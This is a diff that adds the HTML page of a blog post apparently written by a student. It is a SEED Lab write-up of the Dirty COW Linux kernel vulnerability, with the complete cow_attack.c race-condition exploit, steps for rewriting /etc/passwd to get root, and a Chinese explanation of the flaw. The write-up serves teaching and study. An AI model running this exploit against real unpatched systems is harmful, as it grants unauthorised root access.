@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>
+    Dirty-Cow | Simon&#39;s Blog
+  </title>
+  <meta name="description" content="I am the storm.">
+  
+  <meta name="keywords" content="
+  SEED Lab,Dirty Cow
+  ">
+  
+  <meta name="author" content="Simon Nie">
+
+  <meta http-equiv="Cache-Control" content="no-transform"/>
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+  <meta name="theme-color" content="#1e2327">
+  <link rel="apple-touch-icon" href="https://github.githubassets.com/apple-touch-icon.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://github.githubassets.com/apple-touch-icon-180x180.png">
+
+  <link rel="icon" type="image/x-icon" href="https://github.githubassets.com/favicon.ico">
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="stylesheet"
+        href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  
+
+  
+
+
+  <script src="//cdnjs.cloudflare.com/ajax/libs/vue/1.0.25-csp/vue.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.11.2/moment.min.js"></script>
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body id="replica-app">
+
+<nav class="navbar-wrapper">
+  <div class="navbar">
+    <div class="container clearfix">
+      <a href="/" class="navbar-logo"><i class="fa fa-github"></i></a>
+
+      <div class="navbar-search float-left desktop-only">
+        <div class="navbar-search-form">
+          <label for="gsc-i-id1">Google Search</label>
+          <div id="google-search">
+            <gcse:search></gcse:search>
+          </div>
+        </div>
+      </div>
+
+      <ul class="navbar-nav float-left">
+        
+        <li><a href="/archives">Archives</a></li>
+        
+        
+        <li><a href="/categories">Categories</a></li>
+        
+        
+        <li><a href="/tags">Tags</a></li>
+        
+        
+        <li class="desktop-only"><a href="/atom.xml" target="_blank">RSS</a></li>
+        
+      </ul>
+
+      <ul class="navbar-nav user-nav float-right desktop-only">
+        <li class="user-nav-notification">
+          <a><span class="user-nav-unread"></span><i class="fa fa-bell"></i></a>
+        </li>
+        <li>
+          <a><i class="fa fa-plus"></i> <i class="fa fa-caret-down"></i></a>
+        </li>
+        <li class="user-nav-logo">
+          <a><img src="/images/avatar.jpg"> <i class="fa fa-caret-down"></i></i></a>
+        </li>
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<div class="main-container">
+  <header class="header-wrapper desktop-only">
+  <div class="container header-site-detail">
+    <ul class="header-toolbar">
+      <li class="clearfix">
+        <a href="/archives" class="header-toolbar-left"><i
+                  class="fa fa-file-text"></i> Posts </a>
+        <a href="/archives"
+           class="header-toolbar-right"> 23 </a>
+      </li>
+      <li>
+        <a href="/tags" class="header-toolbar-left"><i
+                  class="fa fa-tags"></i> Tags </a>
+        <a href="/tags"
+           class="header-toolbar-right"> 101 </a>
+      </li>
+      <li>
+        <a href="/categories" class="header-toolbar-left"><i
+                  class="fa fa-folder-open"></i> Categories </a>
+        <a href="/categories"
+           class="header-toolbar-right"> 9 </a>
+      </li>
+    </ul>
+    <h2 class="header-title">
+      <i class="fa fa-book text-muted"></i>
+      <a href="/">Simon&#39;s Blog</a>
+      
+      
+    </h2>
+  </div>
+
+  <div class="container">
+    <div class="header-tab-wrapper clearfix">
+      <span class="header-tab header-tab-selected"><i class="fa fa-thumbs-o-up"></i> Like</span>
+      <span class="header-tab"><i class="fa fa-share-alt"></i> Share</span>
+      <span class="header-tab"><i class="fa fa-comments-o"></i> Discussion</span>
+      <span class="header-tab"><i class="fa fa-bookmark-o"></i> Bookmark </span>
+      <span class="header-tab"><i class="fa fa-smile-o"></i> Smile <i class="fa fa-caret-down"></i></span>
+    </div>
+  </div>
+</header>
+
+
+<div class="post-container container">
+  <h3>
+    <i class="fa fa-user-o"></i>
+    Simon Nie
+
+    <span class="post-date float-right" title="{{moment(1580309443000).format('MMM DD, YYYY, h:mm:ss A')}}">
+      <i class="fa fa-pencil-square-o"></i>
+      {{moment(1580309443000).fromNow()}}
+    </span>
+  </h3>
+
+  <article class="post-content">
+    <h1>Dirty-Cow</h1>
+    <p><img src="Race-Condition/Platform-SEEDUbuntu16__04--32bit-green.svg" alt="">  <img src="Dirty-Cow/SEED-SoftwareSecurityLab-brightgreen.svg" alt=""></p>
+<blockquote>
+<p>this report was written by Simon Nie when finishing the SEED Lab — Dirty Cow.</p>
+</blockquote>
+<h1 id="Table-of-Contents"><a href="#Table-of-Contents" class="headerlink" title="Table of Contents"></a>Table of Contents</h1><ul>
+<li><a href="#task-1-modify-a-dummy-read-only-file">Task 1: Modify a Dummy Read-Only File</a><ul>
+<li><a href="#1-create-a-dummy-file">1. Create a Dummy File</a></li>
+<li><a href="#2-set-up-the-memory-mapping-thread">2. Set Up the Memory Mapping Thread</a></li>
+<li><a href="#3-set-up-the-write-thread">3. Set up the write thread.</a></li>
+<li><a href="#4-the-madvise-thread">4. The madvise thread</a></li>
+<li><a href="#5-launch-the-attack">5. Launch the attack</a></li>
+</ul>
+</li>
+<li><a href="#task-2-modify-the-password-file-to-gain-the-root-privilege">Task 2: Modify the Password File to Gain the Root Privilege</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#dirty-cow-漏洞原理分析">Dirty COW 漏洞原理分析</a></li>
+</ul>
+<h2 id="Task-1-Modify-a-Dummy-Read-Only-File"><a href="#Task-1-Modify-a-Dummy-Read-Only-File" class="headerlink" title="Task 1: Modify a Dummy Read-Only File"></a>Task 1: Modify a Dummy Read-Only File</h2><h3 id="1-Create-a-Dummy-File"><a href="#1-Create-a-Dummy-File" class="headerlink" title="1. Create a Dummy File"></a>1. Create a Dummy File</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo touch /zzz</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo chmod 644 /zzz</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo gedit /zzz</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat /zzz</span></span><br><span class="line">111111222222333333</span><br><span class="line"><span class="meta">$</span><span class="bash"> ls -l /zzz</span></span><br><span class="line">-rw-r--r-- 1 root root 19 Oct 18 22:03 /zzz</span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> 99999 &gt; /zzz</span></span><br><span class="line">bash: /zzz: Permission denied</span><br></pre></td></tr></table></figure>
+
+<p>From the above experiment, we can see that if we try to write to this file as a normal user, we will fail, because the file is only readable to normal users. However, because of the Dirty COW vulnerability in the system, we can find a way to write to this file. Our objective is to replace the pattern “222222” with ”<code>*****</code>”.</p>
+<h3 id="2-Set-Up-the-Memory-Mapping-Thread"><a href="#2-Set-Up-the-Memory-Mapping-Thread" class="headerlink" title="2. Set Up the Memory Mapping Thread"></a>2. Set Up the Memory Mapping Thread</h3><p>Download <code>cow_attack.c</code> from the website and read the source code.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">writeThread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">madviseThread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">pthread_t</span> pth1,pth2;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">  <span class="keyword">int</span> file_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Open the target file in the read-only mode.</span></span><br><span class="line">  <span class="keyword">int</span> f=<span class="built_in">open</span>(<span class="string">"/zzz"</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Map the file to COW memory using MAP_PRIVATE.</span></span><br><span class="line">  fstat(f, &amp;st);</span><br><span class="line">  file_size = st.st_size;</span><br><span class="line">  <span class="built_in">map</span>=mmap(<span class="literal">NULL</span>, file_size, PROT_READ, MAP_PRIVATE, f, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Find the position of the target area</span></span><br><span class="line">  <span class="keyword">char</span> *<span class="built_in">position</span> = <span class="built_in">strstr</span>(<span class="built_in">map</span>, <span class="string">"222222"</span>);                        </span><br><span class="line"></span><br><span class="line">  <span class="comment">// We have to do the attack using two threads.</span></span><br><span class="line">  pthread_create(&amp;pth1, <span class="literal">NULL</span>, madviseThread, (<span class="keyword">void</span>  *)file_size); </span><br><span class="line">  pthread_create(&amp;pth2, <span class="literal">NULL</span>, writeThread, <span class="built_in">position</span>);             </span><br><span class="line"></span><br><span class="line">  <span class="comment">// Wait for the threads to finish.</span></span><br><span class="line">  pthread_join(pth1, <span class="literal">NULL</span>);</span><br><span class="line">  pthread_join(pth2, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">writeThread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *content= <span class="string">"******"</span>;</span><br><span class="line">  <span class="keyword">off_t</span> offset = (<span class="keyword">off_t</span>) arg;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> f=<span class="built_in">open</span>(<span class="string">"/proc/self/mem"</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// Move the file pointer to the corresponding position.</span></span><br><span class="line">    lseek(f, offset, SEEK_SET);</span><br><span class="line">    <span class="comment">// Write to the memory.</span></span><br><span class="line">    <span class="built_in">write</span>(f, content, <span class="built_in">strlen</span>(content));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">madviseThread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> file_size = (<span class="keyword">int</span>) arg;</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">      madvise(<span class="built_in">map</span>, file_size, MADV_DONTNEED);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>The program has three threads. One is main thread—mapping <code>/zzz</code> to memory, finds where the pattern <code>222222</code> is, and then creates two threads to exploit the Dirty Cow race condition vulnerability in the OS kernel.</p>
+<h3 id="3-Set-up-the-write-thread"><a href="#3-Set-up-the-write-thread" class="headerlink" title="3. Set up the write thread."></a>3. Set up the <code>write</code> thread.</h3><p>The job of the <code>write</code> thread is to replace the string “222222” in the <strong>memory</strong> with “<code>******</code>”. Since the mapped memory is of COW type (copy on write), this thread alone will only be able to modify the contents in a copy of the mapped memory, which will not cause any change to the <code>/zzz</code> file.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* cow_attack.c (the write thread) */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">writeThread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *content= <span class="string">"******"</span>;</span><br><span class="line"><span class="keyword">off_t</span> offset = (<span class="keyword">off_t</span>) arg;</span><br><span class="line"><span class="keyword">int</span> f=<span class="built_in">open</span>(<span class="string">"/proc/self/mem"</span>, O_RDWR);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line"><span class="comment">// Move the file pointer to the corresponding position.</span></span><br><span class="line">lseek(f, offset, SEEK_SET);</span><br><span class="line"><span class="comment">// Write to the memory.</span></span><br><span class="line"><span class="built_in">write</span>(f, content, <span class="built_in">strlen</span>(content));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-The-madvise-thread"><a href="#4-The-madvise-thread" class="headerlink" title="4. The madvise thread"></a>4. The <code>madvise</code> thread</h3><p>The <code>madvise</code> thread does only one thing: discarding the private copy of the mapped memory, so the page table can point back to the original mapped memory.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* cow_attack.c (the madvise thread) */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">madviseThread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> file_size = (<span class="keyword">int</span>) arg;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">madvise(<span class="built_in">map</span>, file_size, MADV_DONTNEED);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-Launch-the-attack"><a href="#5-Launch-the-attack" class="headerlink" title="5. Launch the attack"></a>5. Launch the attack</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gcc cow_attack.c -lpthread</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> a.out</span></span><br><span class="line">... press Ctrl-C after a few seconds ...</span><br></pre></td></tr></table></figure>
+
+<p>If the <code>write()</code> and the <code>madvise()</code> system calls are invoked alternatively, i.e., one is invoked only after the other is finished, the write operation will always be performed on the private copy, and we will never be able to modify the target file. The only way for the attack to succeed is to perform the <code>madvise()</code> system call while the <code>write()</code> system call is still running. We cannot always achieve that, so we need to try many times. As long as the probability is not extremely low, we have a chance. That is why in the threads, we run the two system calls in an infinite loop. </p>
+<h2 id="Task-2-Modify-the-Password-File-to-Gain-the-Root-Privilege"><a href="#Task-2-Modify-the-Password-File-to-Gain-the-Root-Privilege" class="headerlink" title="Task 2: Modify the Password File to Gain the Root Privilege"></a>Task 2: Modify the Password File to Gain the Root Privilege</h2><p>we want choose the <code>/etc/passwd</code> file as our target file. Please remember get a copy of original <code>passwd</code> file in case we doing something bad.</p>
+<p>add another normal user:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo adduser charlie</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">$</span><span class="bash"> cat /etc/passwd | grep charlie</span></span><br><span class="line">charlie:x:1001:1001:,,,:/home/charlie:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>modify the program, replace “222222” with “1001”, replace “<code>******</code>” with “0000”, replace “/zzz” with “/etc/passwd”. Do the same steps with last part.</p>
+<p>check results.</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">seed@ubuntu$</span><span class="bash"> su charlie</span></span><br><span class="line">Passwd:</span><br><span class="line"><span class="meta">root@ubuntu#</span><span class="bash"> id</span></span><br><span class="line">uid=0(root) gid=1001(charlie) groups=0(root),1001(charlie)</span><br></pre></td></tr></table></figure>
+
+<p>Succeed!</p>
+<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>写入时复制（英语：Copy-on-write，简称COW）是一种计算机程序设计领域的优化策略。其核心思想是，如果有多个调用者（callers）同时请求相同资源（如内存或磁盘上的数据存储），他们会共同获取相同的指针指向相同的资源，直到某个调用者试图修改资源的内容时，系统才会真正复制一份专用副本（private copy）给该调用者，而其他调用者所见到的最初的资源仍然保持不变。这过程对其他的调用者都是透明的（transparently）。</p>
+<p>优点是如果调用者没有修改该资源，就不会有副本（private copy）被建立，因此多个调用者只是读取操作时可以共享同一份资源。</p>
+<p>如果在写的时候，刚好内存中的private copy 被丢弃，那么就会直接指向原文件，修改的内容会直接被写入原文件。</p>
+<h2 id="Dirty-COW-漏洞原理分析"><a href="#Dirty-COW-漏洞原理分析" class="headerlink" title="Dirty COW 漏洞原理分析"></a>Dirty COW 漏洞原理分析</h2><p>详细链接见<a href="https://www.anquanke.com/post/id/84784。" target="_blank" rel="noopener">https://www.anquanke.com/post/id/84784。</a></p>
+<p>简单来说，就是：</p>
+<blockquote>
+<p>当调用write系统调用向/proc/self/mem文件中写入数据时，进入内核态后内核会调用get_user_pages函数获取要写入内存地址。get_user_pages会调用follow_page_mask来获取这块内存的页表项，并同时要求页表项所指向的内存映射具有可写的权限。</p>
+<p>第一次获取内存的页表项会因为缺页而失败。get_user_page调用faultin_page进行缺页处理后第二次调用follow_page_mask获取这块内存的页表项，如果需要获取的页表项指向的是一个只读的映射，那第二次获取也会失败。这时候get_user_pages函数会第三次调用follow_page_mask来获取该内存的页表项，并且不再要求页表项所指向的内存映射具有可写的权限，这时是可以成功获取的，获取成功后内核会对这个只读的内存进行强制的写入操作。</p>
+<p>这个实现是没有问题的，因为本来写入/proc/self/mem就是一个无视映射权限的强行写入，就算是文件映射到虚拟内存中，也不会出现越权写：</p>
+<p>如果写入的虚拟内存是一个VM_PRIVATE的映射，那在缺页的时候内核就会执行COW操作产生一个副本来进行写入，写入的内容是不会同步到文件中的</p>
+<p>如果写入的虚拟内存是一个VM_SHARE的映射，那mmap能够映射成功的充要条件就是进程拥有对该文件的写权限，这样写入的内容同步到文件中也不算越权了。</p>
+<p>但是，在上述流程中，如果第二次获取页表项失败之后，另一个线程调用madvice(addr,addrlen, MADV_DONTNEED),其中addr~addr+addrlen是一个只读文件的VM_PRIVATE的只读内存映射，那该映射的页表项会被置空。这时如果get_user_pages函数第三次调用follow_page_mask来获取该内存的页表项。<strong>由于这次调用不再要求该内存映射具有写权限，所以在缺页处理的时候内核也不再会执行COW操作产生一个副本以供写入。所以缺页处理完成后后第四次调用follow_page_mask获取这块内存的页表项的时候，不仅可以成功获取，而且获取之后强制的写入的内容也会同步到映射的只读文件中。从而导致了只读文件的越权写。</strong></p>
+</blockquote>
+
+  </article>
+</div>
+
+
+    
+
+
+
+
+</div>
+
+<div class="footer-wrapper container">
+  <footer class="footer clearfix">
+    <div class="clearfix">
+    <a href="http://simonnie98.github.io" class="footer-logo">
+      <i class="fa fa-github"></i>
+    </a>
+    <ul class="footer-social-link">
+      <li>© 2019 Simon Nie</li>
+      <li><a href="http://simonnie98.github.io">Home</a></li>
+      
+      <li><a href="https://github.com/SimonNie98" target="_blank" rel="noopener">Github</a></li>
+      
+    </ul>
+    <div class="footer-theme-info">
+      Theme <a href="//github.com/sabrinaluo/hexo-theme-replica" target="_blank" rel="noopener">Replica</a>
+      by <a href="//github.com/sabrinaluo" target="_blank" rel="noopener">Hiitea</a> ❤ Powered by Hexo
+    </div>
+    </div>
+    
+  </footer>
+</div>
+
+
+<script>
+  (function() {
+    var cx = '001135385136731589458:hwqr0dnpaxv';
+    var gcse = document.createElement('script');
+    gcse.type = 'text/javascript';
+    gcse.async = true;
+    gcse.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') +
+      '//cse.google.com/cse.js?cx=' + cx;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(gcse, s);
+  })();
+</script>
+
+
+
+<script src="/js/main.js"></script>
+
+</body>
+</html>
